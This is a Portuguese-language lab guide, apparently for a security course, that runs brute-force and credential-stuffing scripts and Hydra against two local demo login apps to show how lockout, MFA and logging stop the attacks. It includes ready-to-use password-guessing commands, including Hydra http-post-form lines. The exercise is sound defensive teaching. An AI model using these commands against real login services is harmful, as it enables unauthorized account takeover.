# Ataque antes/depois — brute force e credential stuffing

> **Escopo autorizado:** todos os comandos abaixo atacam **apenas** as duas
> aplicações locais deste trabalho (`localhost:5000` e `localhost:5001`),
> criadas e controladas por nós. Nunca aponte estes scripts para qualquer
> outro host.

## 0. Pré-requisitos — subir as duas apps

```bash
# versão vulnerável -> http://localhost:5000
cd app_vulneravel && docker compose up -d --build && cd ..
# versão segura     -> http://localhost:5001
cd app_segura && docker compose up -d --build && cd ..
```

> Sem Docker (alternativa): `python app_vulneravel/run_local.py` e
> `python app_segura/run_local.py` em terminais separados.

Usuário de teste em ambas: **`alvo`**.
- Vulnerável: senha `senha123` (MD5, sem lockout, sem MFA).
- Segura: senha forte desconhecida + MFA ativo + lockout (AC-7).

---

## 1. Força bruta contra a app VULNERÁVEL (deve ter sucesso)

```bash
cd ataque
python brute_force.py --url http://localhost:5000 --usuario alvo \
    --wordlist wordlist.txt --saida ../evidencias/ataque_vuln_bruteforce.txt
```
Esperado: a senha `senha123` é descoberta → **COMPROMETIMENTO TOTAL**.

> 📸 **CAPTURA 1** — salvar screenshot do terminal mostrando `SUCESSO_TOTAL`
> em `evidencias/captura1_bruteforce_vuln.png`.

## 2. Força bruta contra a app SEGURA (deve falhar / bloquear)

```bash
python brute_force.py --url http://localhost:5001 --usuario alvo \
    --wordlist wordlist.txt --saida ../evidencias/ataque_segura_bruteforce.txt
```
Esperado: após 5 tentativas → **BLOQUEADO** (AC-7). Nenhuma senha descoberta.

> 📸 **CAPTURA 2** — screenshot mostrando `BLOQUEADO` após 5 tentativas em
> `evidencias/captura2_bruteforce_segura.png`.

## 3. Credential stuffing contra a app SEGURA (deve falhar)

```bash
python credential_stuffing.py --url http://localhost:5001 \
    --creds creds_vazadas.txt --saida ../evidencias/ataque_segura_stuffing.txt
```
Esperado: a credencial vazada `alvo:senha123` **não** funciona na app segura
(senha diferente + MFA) → **0 contas comprometidas**.

> 📸 **CAPTURA 3** — screenshot mostrando `0 conta(s) comprometida(s)` em
> `evidencias/captura3_stuffing_segura.png`.

## 4. Evidência do lado do servidor (log AU-2/AU-6)

```bash
# Docker:
docker exec app_segura cat /app/seguranca.log | tail -20
# Local (sem Docker): o log fica em app_segura/seguranca.log
tail -20 ../app_segura/seguranca.log
```
Mostra os eventos `LOGIN_FALHA` e `LOCKOUT_ACIONADO` gerados pelo ataque.

> 📸 **CAPTURA 4** — screenshot do log estruturado em
> `evidencias/captura4_log_servidor.png`.

---

## Alternativa com Hydra (opcional)

O mesmo ataque de força bruta pode ser feito com a ferramenta **Hydra**. O
formulário usa POST com os campos `usuario` e `senha`; a condição de falha é a
string `invalidos` no corpo da resposta.

```bash
# App vulnerável (deve encontrar a senha):
hydra -l alvo -P wordlist.txt localhost -s 5000 \
    http-post-form "/login:usuario=^USER^&senha=^PASS^:invalidos"

# App segura (deve ser barrado pelo lockout; use -t 1):
hydra -l alvo -P wordlist.txt localhost -s 5001 -t 1 \
    http-post-form "/login:usuario=^USER^&senha=^PASS^:invalidos"
```

> 📸 **CAPTURA 5 (opcional)** — screenshot da saída do Hydra em
> `evidencias/captura5_hydra.png`.

---

## Encerrar o laboratório

```bash
cd app_vulneravel && docker compose down && cd ..
cd app_segura && docker compose down && cd ..
```
